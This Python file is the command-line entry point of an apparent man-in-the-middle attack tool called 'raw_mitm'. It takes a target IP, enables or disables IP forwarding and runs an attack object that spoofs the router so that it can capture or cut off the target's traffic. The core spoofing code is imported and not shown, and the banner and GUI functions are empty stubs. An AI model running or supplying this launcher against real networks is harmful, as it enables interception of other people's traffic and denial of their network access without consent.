from raw_mitm import MitmAttack
from raw_mitm.models import MitmArgs
from raw_mitm.utils import *

from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("-t", "--target", type=str, help="Target ip to spoof")
parser.add_argument("--interrupt", action="store_true", help="Interrupt target host data rather than capture its traffic")
parser.add_argument("--gui", action="store_true", help="Show GUI to parse arguments that can be parsed in the terminal")

def print_banner():
    pass

def cli(args) -> None:
    print_banner()
    check_permissions()
    allow_ip_forwarding(not_allow=args.interrupt)

    attack = MitmAttack(MitmArgs(
        router_ip=get_router_ip(),
        target_ip=args.target,
        your_mac=get_device_mac_address(),
        target_mac=None,
        router_mac=None,
        interface=get_interface()
    ))

    attack.run()

def gui() -> None:
    pass

def main() -> None:
    args = parser.parse_args()
    if args.gui:
        gui()
    cli(args)

if __name__ == '__main__':
    main()
